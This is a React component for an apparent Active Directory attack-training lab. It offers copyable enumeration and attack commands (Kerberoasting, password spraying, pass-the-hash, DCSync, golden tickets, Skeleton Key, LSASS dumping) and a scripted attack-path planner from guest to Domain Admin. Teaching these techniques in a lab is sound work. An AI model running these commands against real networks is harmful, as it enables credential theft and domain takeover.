import React, { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
    Network, Shield, Zap, Search, Brain,
    Toolbox, Scroll, Copy, Crown, Key,
    MousePointer2, ArrowRight, Terminal,
    ExternalLink, Activity, Info,
    ChevronRight, CheckCircle2, Lock, Play, Square
} from 'lucide-react';
import { useLabManager } from '../../hooks/useLabManager';

const ADAttackLab = () => {
    // --- REAL LAB MANAGER ---
    const { status: labStatus, startLab, stopLab, connectionInfo, isLoading } = useLabManager('ad-lab');
    // ------------------------
    const [activeTab, setActiveTab] = useState('enum');
    const [activeCategory, setActiveCategory] = useState('users');
    const [plannerState, setPlannerState] = useState({
        startNode: 'Guest',
        targetNode: 'Domain Admin',
        generatedPath: null
    });

    const enumCommands = {
        users: [
            { name: 'Get All Users', cmd: 'Get-ADUser -Filter * -Properties *', tool: 'PowerShell' },
            { name: 'Get User Info', cmd: 'Get-ADUser -Identity username -Properties *', tool: 'PowerShell' },
            { name: 'LDAP Users', cmd: 'ldapsearch -x -H ldap://DC -b "DC=domain,DC=local" "(objectClass=user)"', tool: 'Linux' },
            { name: 'Net Users', cmd: 'net user /domain', tool: 'CMD' },
            { name: 'Enum4linux', cmd: 'enum4linux -U 10.10.10.10', tool: 'Linux' }
        ],
        groups: [
            { name: 'All Groups', cmd: 'Get-ADGroup -Filter * | Select Name', tool: 'PowerShell' },
            { name: 'Domain Admins', cmd: 'Get-ADGroupMember -Identity "Domain Admins"', tool: 'PowerShell' },
            { name: 'Enterprise Admins', cmd: 'Get-ADGroupMember -Identity "Enterprise Admins"', tool: 'PowerShell' },
            { name: 'Net Groups', cmd: 'net group /domain', tool: 'CMD' },
            { name: 'Nested Groups', cmd: 'Get-ADGroupMember -Identity "GroupName" -Recursive', tool: 'PowerShell' }
        ],
        computers: [
            { name: 'All Computers', cmd: 'Get-ADComputer -Filter * -Properties *', tool: 'PowerShell' },
            { name: 'Domain Controllers', cmd: 'Get-ADDomainController -Filter *', tool: 'PowerShell' },
            { name: 'Net Computers', cmd: 'net view /domain', tool: 'CMD' },
            { name: 'Find DCs', cmd: 'nltest /dclist:domain.local', tool: 'CMD' }
        ],
        shares: [
            { name: 'Net View', cmd: 'net view \\\\server', tool: 'CMD' },
            { name: 'PowerView Shares', cmd: 'Find-DomainShare -CheckShareAccess', tool: 'PowerView' },
            { name: 'smbclient', cmd: 'smbclient -L //10.10.10.10 -U user', tool: 'Linux' },
            { name: 'CrackMapExec', cmd: 'crackmapexec smb 10.10.10.0/24 --shares', tool: 'Linux' }
        ],
        gpo: [
            { name: 'All GPOs', cmd: 'Get-GPO -All', tool: 'PowerShell' },
            { name: 'GPO Report', cmd: 'Get-GPOReport -All -ReportType HTML -Path gpo.html', tool: 'PowerShell' },
            { name: 'GPP Passwords', cmd: 'Get-GPPPassword', tool: 'PowerSploit' }
        ],
        acl: [
            { name: 'User ACLs', cmd: 'Get-DomainObjectAcl -Identity "user" -ResolveGUIDs', tool: 'PowerView' },
            { name: 'Find WriteDACL', cmd: 'Find-InterestingDomainAcl -ResolveGUIDs', tool: 'PowerView' },
            { name: 'BloodHound', cmd: 'SharpHound.exe -c All', tool: 'SharpHound' }
        ]
    };

    const attacks = {
        initial: [
            {
                name: 'AS-REP Roasting', desc: 'Get hash for users with no pre-auth',
                cmd: "GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10", tool: 'Impacket'
            },
            {
                name: 'Kerberoasting', desc: 'Get TGS for service accounts',
                cmd: "GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.10 -request", tool: 'Impacket'
            },
            {
                name: 'Password Spray', desc: 'Try one password across many users',
                cmd: "crackmapexec smb 10.10.10.10 -u users.txt -p 'Password123'", tool: 'CME'
            },
            {
                name: 'LLMNR/NBT-NS', desc: 'Capture hashes via poisoning',
                cmd: 'responder -I eth0 -rdwv', tool: 'Responder'
            }
        ],
        lateral: [
            {
                name: 'Pass the Hash', desc: 'Use NTLM hash instead of password',
                cmd: "psexec.py domain/user@10.10.10.10 -hashes :NTLM_HASH", tool: 'Impacket'
            },
            {
                name: 'Pass the Ticket', desc: 'Use Kerberos ticket',
                cmd: 'Rubeus.exe ptt /ticket:ticket.kirbi', tool: 'Rubeus'
            },
            {
                name: 'Overpass the Hash', desc: 'Convert NTLM to Kerberos TGT',
                cmd: 'sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH /run:powershell', tool: 'Mimikatz'
            },
            {
                name: 'DCOM Exec', desc: 'Execute via DCOM',
                cmd: "dcomexec.py domain/user:pass@10.10.10.10", tool: 'Impacket'
            },
            {
                name: 'WinRM', desc: 'Remote PowerShell',
                cmd: "evil-winrm -i 10.10.10.10 -u user -p pass", tool: 'Evil-WinRM'
            }
        ],
        privilege: [
            {
                name: 'DCSync', desc: 'Replicate DC to get all hashes',
                cmd: 'lsadump::dcsync /domain:domain.local /user:Administrator', tool: 'Mimikatz'
            },
            {
                name: 'Dump NTDS.dit', desc: 'Dump AD database',
                cmd: "secretsdump.py domain/user:pass@10.10.10.10", tool: 'Impacket'
            },
            {
                name: 'Golden Ticket', desc: 'Forge TGT with KRBTGT hash',
                cmd: 'kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt', tool: 'Mimikatz'
            },
            {
                name: 'Silver Ticket', desc: 'Forge TGS for specific service',
                cmd: 'kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /target:server /service:cifs /rc4:HASH /ptt', tool: 'Mimikatz'
            },
            {
                name: 'Skeleton Key', desc: 'Backdoor DC authentication',
                cmd: 'misc::skeleton', tool: 'Mimikatz'
            }
        ],
        delegation: [
            {
                name: 'Unconstrained', desc: 'Dump tickets from memory',
                cmd: 'sekurlsa::tickets /export', tool: 'Mimikatz'
            },
            {
                name: 'Constrained S4U', desc: 'S4U2Self + S4U2Proxy',
                cmd: 'Rubeus.exe s4u /user:svc /rc4:HASH /impersonateuser:admin /msdsspn:cifs/server', tool: 'Rubeus'
            },
            {
                name: 'RBCD Attack', desc: 'Resource-based constrained delegation',
                cmd: 'Set-ADComputer target -PrincipalsAllowedToDelegateToAccount attacker$', tool: 'PowerShell'
            }
        ]
    };

    const tools = [
        { name: 'BloodHound', desc: 'AD attack path visualization', link: 'https://github.com/BloodHoundAD/BloodHound' },
        { name: 'Impacket', desc: 'Python AD exploitation library', link: 'https://github.com/SecureAuthCorp/impacket' },
        { name: 'Mimikatz', desc: 'Windows credential extraction', link: 'https://github.com/gentilkiwi/mimikatz' },
        { name: 'Rubeus', desc: 'Kerberos abuse toolkit', link: 'https://github.com/GhostPack/Rubeus' },
        { name: 'PowerView', desc: 'AD enumeration module', link: 'https://github.com/PowerShellMafia/PowerSploit' },
        { name: 'CrackMapExec', desc: 'Swiss army knife for AD', link: 'https://github.com/byt3bl33d3r/CrackMapExec' },
        { name: 'Evil-WinRM', desc: 'WinRM shell for pentesting', link: 'https://github.com/Hackplayers/evil-winrm' }
    ];

    const [copied, setCopied] = useState(false);

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const handleGeneratePath = () => {
        const start = plannerState.startNode;
        let generated = [];

        if (start === 'Guest') {
            generated = [
                { icon: Search, title: 'AS-REP Roasting', desc: 'Identify users that do not require Pre-Auth.', cmd: 'GetNPUsers.py domain/ -request' },
                { icon: Key, title: 'Crack Hash', desc: 'Crack the AS-REP hash to get a user password.', cmd: 'hashcat -m 18200 hash.txt rockyou.txt' },
                { icon: Terminal, title: 'Domain User Access', desc: 'Log in as the roasting victim.', cmd: 'evil-winrm -u victim -p password' },
                { icon: Zap, title: 'Kerberoasting', desc: 'Request TGS for service accounts.', cmd: 'GetUserSPNs.py -request' },
                { icon: Network, title: 'Lateral Movement', desc: 'Access server where Domain Admin is logged in.', cmd: 'Find-LocalAdminAccess' },
                { icon: Crown, title: 'DCSync (Domain Admin)', desc: 'Replicate secrets from the Domain Controller.', cmd: 'secretsdump.py domain/user@dc' }
            ];
        } else if (start === 'User') {
            generated = [
                { icon: Zap, title: 'Kerberoasting', desc: 'Request TGS for service accounts.', cmd: 'GetUserSPNs.py -request' },
                { icon: Network, title: 'Lateral Movement', desc: 'Access server where Domain Admin is logged in.', cmd: 'Find-LocalAdminAccess' },
                { icon: Shield, title: 'Token Impersonation', desc: 'Steal Domain Admin token.', cmd: 'Incognito: list_tokens -u' },
                { icon: Crown, title: 'DCSync (Domain Admin)', desc: 'Replicate secrets from the Domain Controller.', cmd: 'secretsdump.py domain/user@dc' }
            ];
        } else if (start === 'LocalAdmin') {
            generated = [
                { icon: Activity, title: 'Dump LSASS', desc: 'Extract cached credentials or tickets from memory.', cmd: 'mimikatz "sekurlsa::logonpasswords"' },
                { icon: ArrowRight, title: 'Pass the Hash/Ticket', desc: 'Use extracted creds to move laterally.', cmd: 'psexec.py domain/admin@target' },
                { icon: Crown, title: 'DCSync (Domain Admin)', desc: 'Replicate secrets from the Domain Controller.', cmd: 'secretsdump.py domain/user@dc' }
            ];
        } else if (start === 'ServiceAccount') {
            generated = [
                { icon: Lock, title: 'Constrained Delegation', desc: 'Abuse S4U2Self to impersonate Domain Admin.', cmd: 'Rubeus.exe s4u /user:svc /rc4:HASH /impersonate:admin' },
                { icon: Crown, title: 'DCSync (Domain Admin)', desc: 'Replicate secrets from the Domain Controller.', cmd: 'secretsdump.py domain/user@dc' }
            ];
        }

        setPlannerState({ ...plannerState, generatedPath: generated });
    };

    const containerVariants = {
        hidden: { opacity: 0, y: 20 },
        visible: { opacity: 1, y: 0, transition: { duration: 0.5, staggerChildren: 0.1 } }
    };

    const cardVariants = {
        hidden: { opacity: 0, x: -10 },
        visible: { opacity: 1, x: 0 }
    };

    return (
        <div className="min-h-screen bg-[#0a0a0c] text-slate-100 p-4 md:p-8 font-['Outfit']">
            {/* Header */}
            <header className="max-w-7xl mx-auto mb-10 mt-12">
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-6">
                    <motion.div
                        initial={{ opacity: 0, x: -20 }}
                        animate={{ opacity: 1, x: 0 }}
                    >
                        <div className="flex items-center gap-3 mb-2">
                            <div className="p-2 bg-blue-500/10 rounded-lg border border-blue-500/20">
                                <Network className="w-8 h-8 text-blue-400" />
                            </div>
                            <h1 className="text-4xl font-black bg-gradient-to-r from-white via-blue-100 to-blue-400 bg-clip-text text-transparent uppercase tracking-tight">
                                AD Attack Lab <span className="text-blue-500">AI</span>
                            </h1>
                        </div>
                        <p className="text-slate-400 max-w-2xl text-lg flex items-center gap-2">
                            <Activity className="w-4 h-4 text-emerald-400" />
                            Advanced Active Directory Enumeration & Exploitation Platform
                        </p>
                    </motion.div>

                    <div className="flex gap-4">
                        <div className="px-4 py-2 bg-blue-500/5 border border-blue-500/20 rounded-xl">
                            <div className="text-xs text-blue-400 uppercase font-bold tracking-widest mb-1">Status</div>
                            <div className="flex items-center gap-2">
                                <div className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
                                <span className="text-sm font-mono tracking-tighter uppercase">Operational</span>
                            </div>
                        </div>
                    </div>
                </div>
            </header>



            <main className="max-w-7xl mx-auto">
                {/* --- LAB CONTROLS (Real World) --- */}
                <div className="bg-[#1a1b26] border border-blue-500/30 rounded-xl p-6 mb-10 flex flex-col md:flex-row items-center justify-between gap-6 shadow-2xl shadow-blue-900/20 relative overflow-hidden group">
                    <div className="absolute top-0 left-0 w-1 h-full bg-gradient-to-b from-blue-500 to-purple-600" />

                    <div className="flex items-center gap-6 z-10">
                        <div className="p-4 bg-blue-500/20 rounded-2xl text-blue-400 shadow-inner shadow-blue-500/10">
                            {labStatus === 'running' ? <Activity className="animate-pulse w-8 h-8" /> : <Network className="w-8 h-8" />}
                        </div>
                        <div>
                            <h3 className="text-2xl font-black text-white flex items-center gap-3 uppercase tracking-tighter">
                                Target Environment
                                {labStatus === 'running' && <span className="text-[10px] bg-emerald-500 text-black px-2 py-0.5 rounded font-black tracking-normal">LIVE</span>}
                            </h3>
                            <p className="text-slate-400 font-medium">Provision a real Active Directory Domain Controller (Samba4) for live exploitation.</p>
                        </div>
                    </div>

                    <div className="flex flex-col items-end gap-4 z-10 w-full md:w-auto">
                        {labStatus === 'running' && connectionInfo && (
                            <div className="animate-fadeIn w-full md:w-auto">
                                <div className="bg-black/40 rounded-xl p-4 border border-blue-500/20 font-mono text-xs space-y-2">
                                    <div className="flex justify-between gap-8">
                                        <span className="text-slate-500">Domain Controller IP</span>
                                        <span className="text-emerald-400 font-bold">{connectionInfo.ip_address}</span>
                                    </div>
                                    <div className="flex justify-between gap-8">
                                        <span className="text-slate-500">Domain Name</span>
                                        <span className="text-blue-400 font-bold">domain.local</span>
                                    </div>
                                    <div className="flex justify-between gap-8">
                                        <span className="text-slate-500">Guest User</span>
                                        <span className="text-orange-400 font-bold">Guest / Password123</span>
                                    </div>
                                    <div className="pt-2 border-t border-white/5 mt-2">
                                        <div className="text-[10px] text-slate-600 uppercase font-bold mb-1">Quick Connect (RDP)</div>
                                        <code className="text-slate-300 select-all">xfreerdp /v:{connectionInfo.ip_address} /u:Guest /p:Password123</code>
                                    </div>
                                </div>
                            </div>
                        )}

                        <div className="flex gap-3 w-full md:w-auto">
                            {labStatus === 'idle' || labStatus === 'error' ? (
                                <button
                                    onClick={() => startLab()}
                                    disabled={isLoading}
                                    className={`flex-1 md:flex-none flex items-center justify-center gap-2 px-8 py-3 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white rounded-xl font-black uppercase tracking-widest transition-all shadow-lg shadow-emerald-900/20 ${isLoading ? 'opacity-50 cursor-not-allowed' : ''}`}
                                >
                                    <Play size={18} fill="currentColor" /> {isLoading ? 'Provisioning...' : 'Deploy Range'}
                                </button>
                            ) : (
                                <button
                                    onClick={stopLab}
                                    disabled={isLoading}
                                    className="flex-1 md:flex-none flex items-center justify-center gap-2 px-8 py-3 bg-red-600 hover:bg-red-500 text-white rounded-xl font-black uppercase tracking-widest transition-all shadow-lg shadow-red-900/20"
                                >
                                    <Square size={18} fill="currentColor" /> {isLoading ? 'Stopping...' : 'Destroy Range'}
                                </button>
                            )}
                        </div>
                    </div>
                </div>
                {/* Tabs */}
                <div className="flex flex-wrap gap-2 mb-8 bg-slate-900/40 p-1.5 rounded-2xl border border-slate-800/50 backdrop-blur-sm sticky top-20 z-10">
                    {[
                        { id: 'enum', label: 'Enumeration', icon: Search },
                        { id: 'attacks', label: 'Attacks', icon: Shield },
                        { id: 'planner', label: 'AI Planner', icon: Brain },
                        { id: 'tools', label: 'Toolbox', icon: Toolbox },
                        { id: 'cheatsheet', label: 'Cheatsheet', icon: Scroll },
                    ].map(tab => (
                        <button
                            key={tab.id}
                            onClick={() => setActiveTab(tab.id)}
                            className={`flex items-center gap-2 px-5 py-2.5 rounded-xl transition-all duration-300 ${activeTab === tab.id
                                ? 'bg-blue-600 text-white shadow-lg shadow-blue-900/20'
                                : 'text-slate-400 hover:bg-slate-800/50 hover:text-slate-200'
                                }`}
                        >
                            <tab.icon className="w-4 h-4" />
                            <span className="font-bold text-sm tracking-wide">{tab.label}</span>
                        </button>
                    ))}
                </div>

                <AnimatePresence mode="wait">
                    <motion.div
                        key={activeTab}
                        initial={{ opacity: 0, y: 10 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -10 }}
                        className="space-y-6"
                    >
                        {/* Enumeration Tab */}
                        {activeTab === 'enum' && (
                            <div className="space-y-6">
                                <div className="flex flex-wrap gap-2">
                                    {Object.keys(enumCommands).map(cat => (
                                        <button
                                            key={cat}
                                            onClick={() => setActiveCategory(cat)}
                                            className={`px-4 py-1.5 rounded-full text-sm font-bold border transition-all ${activeCategory === cat
                                                ? 'bg-blue-500/10 border-blue-500/40 text-blue-400'
                                                : 'bg-slate-900/50 border-slate-700/50 text-slate-400 hover:border-slate-500'
                                                }`}
                                        >
                                            {cat.toUpperCase()}
                                        </button>
                                    ))}
                                </div>

                                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                                    {enumCommands[activeCategory].map((cmd, idx) => (
                                        <motion.div
                                            key={idx}
                                            variants={cardVariants}
                                            className="bg-slate-900/40 border border-slate-800/50 p-5 rounded-2xl hover:border-blue-500/30 transition-all group"
                                        >
                                            <div className="flex justify-between items-start mb-4">
                                                <h3 className="font-bold text-slate-200">{cmd.name}</h3>
                                                <span className="text-[10px] font-black bg-blue-500/10 text-blue-400 px-2 py-0.5 rounded border border-blue-500/20 uppercase tracking-tighter">
                                                    {cmd.tool}
                                                </span>
                                            </div>
                                            <div className="relative">
                                                <div className="bg-black/40 rounded-xl p-3 font-mono text-sm text-emerald-400 border border-slate-800 break-all pr-10">
                                                    {cmd.cmd}
                                                </div>
                                                <button onClick={() => copyToClipboard(step.cmd)} className={`transition-colors ${copied ? 'text-green-400' : 'text-slate-600 hover:text-blue-400'}`}>
                                                    {copied ? <CheckCircle2 className="w-3 h-3" /> : <Copy className="w-3 h-3" />}
                                                </button>
                                            </div>
                                        </motion.div>
                                    ))}
                                </div>
                            </div>
                        )}

                        {/* Attacks Tab */}
                        {activeTab === 'attacks' && (
                            <div className="grid grid-cols-1 gap-12">
                                {Object.entries(attacks).map(([phase, items]) => (
                                    <div key={phase} className="space-y-6">
                                        <div className="flex items-center gap-4">
                                            <h2 className="text-xl font-black text-slate-200 uppercase tracking-widest flex items-center gap-3">
                                                <span className="w-10 h-0.5 bg-red-500" />
                                                {phase.replace(/([A-Z])/g, ' $1')} Access
                                            </h2>
                                        </div>
                                        <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                            {items.map((item, idx) => (
                                                <div key={idx} className="bg-slate-900/40 border border-slate-800/50 rounded-2xl p-6 hover:border-red-500/20 transition-all group">
                                                    <div className="flex justify-between items-start mb-3">
                                                        <h4 className="text-lg font-bold text-white group-hover:text-red-400 transition-colors uppercase italic">{item.name}</h4>
                                                        <span className="bg-red-500/10 text-red-400 px-3 py-1 rounded-full text-xs font-bold border border-red-500/20">
                                                            {item.tool}
                                                        </span>
                                                    </div>
                                                    <p className="text-slate-400 text-sm mb-5 leading-relaxed">{item.desc}</p>
                                                    <div className="relative group/cmd">
                                                        <div className="bg-black/60 rounded-xl p-4 font-mono text-sm text-emerald-400 border border-slate-800 group-hover:border-red-500/20 transition-all pr-12">
                                                            {item.cmd}
                                                        </div>
                                                        <button
                                                            onClick={() => copyToClipboard(item.cmd)}
                                                            className="absolute right-3 top-1/2 -translate-y-1/2 p-2 text-slate-500 hover:text-white hover:bg-red-500/20 rounded-lg transition-all"
                                                        >
                                                            <Copy className="w-4 h-4" />
                                                        </button>
                                                    </div>
                                                </div>
                                            ))}
                                        </div>
                                    </div>
                                ))}
                            </div>
                        )}

                        {/* AI Planner Tab */}
                        {activeTab === 'planner' && (
                            <div className="bg-slate-900/30 border border-slate-800/50 rounded-3xl p-6 md:p-10 backdrop-blur-md">
                                <div className="text-center max-w-2xl mx-auto mb-12">
                                    <div className="w-20 h-20 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto mb-6 border-2 border-blue-500/20 shadow-2xl shadow-blue-500/10">
                                        <Brain className="w-10 h-10 text-blue-400" />
                                    </div>
                                    <h2 className="text-3xl font-black text-white mb-4">AI Attack Path Planner</h2>
                                    <p className="text-slate-400">Simulate advanced BloodHound logic to discover the most efficient path to Domain Sovereignty.</p>
                                </div>

                                <div className="max-w-4xl mx-auto bg-black/40 p-8 rounded-3xl border border-slate-800/50 mb-12">
                                    <div className="grid grid-cols-1 md:grid-cols-3 gap-8 items-end">
                                        <div className="space-y-3">
                                            <label className="text-xs font-black uppercase tracking-widest text-blue-400 flex items-center gap-2">
                                                <MousePointer2 className="w-3 h-3" /> Current Access
                                            </label>
                                            <select
                                                value={plannerState.startNode}
                                                onChange={(e) => setPlannerState({ ...plannerState, startNode: e.target.value })}
                                                className="w-full bg-slate-900 border border-slate-700 p-4 rounded-xl text-slate-200 outline-none focus:border-blue-500 transition-all cursor-pointer"
                                            >
                                                <option value="Guest">Unauthenticated (Guest)</option>
                                                <option value="User">Domain User</option>
                                                <option value="LocalAdmin">Local Admin</option>
                                                <option value="ServiceAccount">Service Account</option>
                                            </select>
                                        </div>

                                        <div className="flex justify-center pb-4 text-slate-600 hidden md:flex">
                                            <ArrowRight className="w-8 h-8" />
                                        </div>

                                        <div className="space-y-3">
                                            <label className="text-xs font-black uppercase tracking-widest text-red-400 flex items-center gap-2">
                                                <Crown className="w-3 h-3" /> Target Object
                                            </label>
                                            <div className="w-full bg-slate-900/50 border border-slate-800 p-4 rounded-xl text-slate-500 font-bold flex items-center justify-between">
                                                Domain Admin
                                                <Lock className="w-4 h-4 opacity-50" />
                                            </div>
                                        </div>
                                    </div>

                                    <button
                                        onClick={handleGeneratePath}
                                        className="w-full mt-10 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white font-black py-4 rounded-2xl flex items-center justify-center gap-3 transition-all transform hover:scale-[1.01] active:scale-[0.99] shadow-xl shadow-blue-900/20"
                                    >
                                        <Brain className="w-5 h-5" />
                                        GENERATE OPTIMAL PATH
                                    </button>
                                </div>

                                {/* Path Display */}
                                {plannerState.generatedPath && (
                                    <motion.div
                                        initial={{ opacity: 0, scale: 0.95 }}
                                        animate={{ opacity: 1, scale: 1 }}
                                        className="max-w-3xl mx-auto space-y-4"
                                    >
                                        <div className="flex items-center gap-4 mb-8">
                                            <div className="h-0.5 flex-1 bg-gradient-to-r from-transparent to-blue-500/50" />
                                            <span className="text-xs font-black text-blue-400 uppercase tracking-[0.3em]">Execution Sequence</span>
                                            <div className="h-0.5 flex-1 bg-gradient-to-l from-transparent to-blue-500/50" />
                                        </div>

                                        {plannerState.generatedPath.map((step, idx) => (
                                            <div key={idx} className="relative group">
                                                {idx < plannerState.generatedPath.length - 1 && (
                                                    <div className="absolute left-10 top-20 bottom-0 w-0.5 bg-gradient-to-b from-blue-500/50 to-transparent z-0" />
                                                )}
                                                <div className="relative z-10 bg-slate-900/60 border border-slate-800 p-6 rounded-3xl flex gap-6 hover:bg-slate-800/60 transition-all hover:border-blue-500/30">
                                                    <div className="w-20 h-20 bg-blue-500/10 rounded-2xl flex items-center justify-center flex-shrink-0 border border-blue-500/20 group-hover:bg-blue-500/20 transition-all">
                                                        <step.icon className="w-10 h-10 text-blue-400" />
                                                    </div>
                                                    <div className="flex-1">
                                                        <div className="flex items-center gap-3 mb-2">
                                                            <span className="text-[10px] font-black bg-blue-500/20 text-blue-300 px-2 py-0.5 rounded uppercase tracking-tighter">Step 0{idx + 1}</span>
                                                            <h4 className="text-lg font-black text-white">{step.title}</h4>
                                                        </div>
                                                        <p className="text-slate-400 text-sm mb-4 leading-relaxed">{step.desc}</p>
                                                        <div className="bg-black/40 p-3 rounded-xl border border-slate-800/50 font-mono text-xs text-emerald-400 flex items-center justify-between">
                                                            {step.cmd}
                                                            <button onClick={() => copyToClipboard(step.cmd)} className="text-slate-600 hover:text-blue-400">
                                                                <Copy className="w-3 h-3" />
                                                            </button>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        ))}

                                        <div className="pt-10 flex justify-center gap-8">
                                            <div className="flex items-center gap-3 text-slate-500">
                                                <Activity className="w-5 h-5 text-emerald-500" />
                                                <span className="text-sm font-bold uppercase tracking-widest">OpSec: Safe</span>
                                            </div>
                                            <div className="flex items-center gap-3 text-slate-500">
                                                <Info className="w-5 h-5 text-blue-500" />
                                                <span className="text-sm font-bold uppercase tracking-widest">Complexity: High</span>
                                            </div>
                                        </div>
                                    </motion.div>
                                )}
                            </div>
                        )}

                        {/* Tools Tab */}
                        {activeTab === 'tools' && (
                            <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
                                {tools.map((tool, idx) => (
                                    <div key={idx} className="bg-slate-900/40 border border-slate-800/50 p-8 rounded-3xl hover:border-blue-500/30 transition-all hover:shadow-2xl hover:shadow-blue-500/5 group">
                                        <div className="h-2 w-12 bg-blue-500 rounded-full mb-6 group-hover:w-24 transition-all" />
                                        <h4 className="text-xl font-black text-white mb-3 uppercase tracking-tighter italic">{tool.name}</h4>
                                        <p className="text-slate-400 text-sm mb-8 leading-relaxed">{tool.desc}</p>
                                        <a
                                            href={tool.link}
                                            target="_blank"
                                            rel="noreferrer"
                                            className="inline-flex items-center gap-2 text-sm font-black text-blue-400 hover:text-blue-300 transition-colors"
                                        >
                                            <ExternalLink className="w-4 h-4" />
                                            REPOSITORY
                                        </a>
                                    </div>
                                ))}
                            </div>
                        )}

                        {/* Cheatsheet Tab */}
                        {activeTab === 'cheatsheet' && (
                            <div className="space-y-12">
                                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
                                    <div className="bg-slate-900/40 border border-slate-800/50 p-8 rounded-3xl">
                                        <h3 className="text-2xl font-black text-white mb-8 flex items-center gap-3 uppercase tracking-widest">
                                            <span className="p-2 bg-emerald-500/10 rounded-lg text-emerald-400"><Scroll className="w-6 h-6" /></span>
                                            AD methodology
                                        </h3>
                                        <div className="space-y-6">
                                            {[
                                                { phase: '1. Reconnaissance', tasks: ['Domain/DC ID', 'User/Group Enum', 'SPN Hunting'] },
                                                { phase: '2. Initial Access', tasks: ['Roasting', 'Spray Attacks', 'Poisoning'] },
                                                { phase: '3. Lateral Movement', tasks: ['PtH/PtT', 'WinRM/WMI', 'RDP/SSH'] },
                                                { phase: '4. PrivEsc', tasks: ['DCSync', 'GPO Abuse', 'ACL/ACE Abuse'] },
                                                { phase: '5. Dominance', tasks: ['Golden Ticket', 'Skeleton Key', 'Persistence'] },
                                            ].map((p, idx) => (
                                                <div key={idx} className="flex gap-6">
                                                    <div className="flex flex-col items-center">
                                                        <div className="w-8 h-8 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center text-xs font-black text-slate-400">{idx + 1}</div>
                                                        {idx < 4 && <div className="flex-1 w-px bg-slate-700 my-2" />}
                                                    </div>
                                                    <div>
                                                        <h4 className="font-bold text-slate-100 mb-2 uppercase text-sm tracking-wide">{p.phase}</h4>
                                                        <div className="flex flex-wrap gap-2">
                                                            {p.tasks.map((t, tidx) => (
                                                                <span key={tidx} className="text-[10px] font-black bg-slate-800/50 text-slate-400 px-2 py-1 rounded border border-slate-700 uppercase">{t}</span>
                                                            ))}
                                                        </div>
                                                    </div>
                                                </div>
                                            ))}
                                        </div>
                                    </div>

                                    <div className="space-y-6">
                                        <div className="bg-gradient-to-br from-blue-600/20 to-transparent border border-blue-500/20 p-8 rounded-3xl">
                                            <h3 className="text-xl font-black text-blue-400 mb-6 uppercase tracking-widest flex items-center gap-2">
                                                <Zap className="w-5 h-5" /> Quick Wins
                                            </h3>
                                            <div className="space-y-4 font-mono text-xs">
                                                <div className="bg-black/40 p-4 rounded-2xl border border-blue-500/10 flex items-center justify-between group">
                                                    <span className="text-slate-400">Find AS-REP: <code className="text-emerald-400 ml-2">DoesNotRequirePreAuth</code></span>
                                                    <button onClick={() => copyToClipboard('Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True}')} className="opacity-0 group-hover:opacity-100 transition-opacity text-blue-400"><Copy className="w-3 h-3" /></button>
                                                </div>
                                                <div className="bg-black/40 p-4 rounded-2xl border border-blue-500/10 flex items-center justify-between group">
                                                    <span className="text-slate-400">Find SPNs: <code className="text-emerald-400 ml-2">ServicePrincipalName</code></span>
                                                    <button onClick={() => copyToClipboard('Get-ADUser -Filter {ServicePrincipalName -ne "$null"}')} className="opacity-0 group-hover:opacity-100 transition-opacity text-blue-400"><Copy className="w-3 h-3" /></button>
                                                </div>
                                                <div className="bg-black/40 p-4 rounded-2xl border border-blue-500/10 flex items-center justify-between group">
                                                    <span className="text-slate-400">Find Admins: <code className="text-emerald-400 ml-2">Domain Admins</code></span>
                                                    <button onClick={() => copyToClipboard('Get-ADGroupMember "Domain Admins" -Recursive')} className="opacity-0 group-hover:opacity-100 transition-opacity text-blue-400"><Copy className="w-3 h-3" /></button>
                                                </div>
                                            </div>
                                        </div>

                                        <div className="bg-slate-900 border border-slate-800 p-8 rounded-3xl">
                                            <h3 className="text-xl font-black text-white mb-6 uppercase tracking-widest flex items-center gap-2">
                                                <Info className="w-5 h-5 text-slate-500" /> Analyst Notes
                                            </h3>
                                            <div className="space-y-4">
                                                <div className="flex gap-3">
                                                    <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0 mt-1" />
                                                    <p className="text-sm text-slate-400 leading-relaxed">Always check for GPO permissions. Write access to a GPO is an instant Domain Admin win via scheduled tasks.</p>
                                                </div>
                                                <div className="flex gap-3">
                                                    <CheckCircle2 className="w-4 h-4 text-emerald-500 shrink-0 mt-1" />
                                                    <p className="text-sm text-slate-400 leading-relaxed">BloodHound is your best friend. Look for short-hop paths where you can escalate via local groups.</p>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        )}
                    </motion.div>
                </AnimatePresence>
            </main>
        </div >
    );
};

export default ADAttackLab;
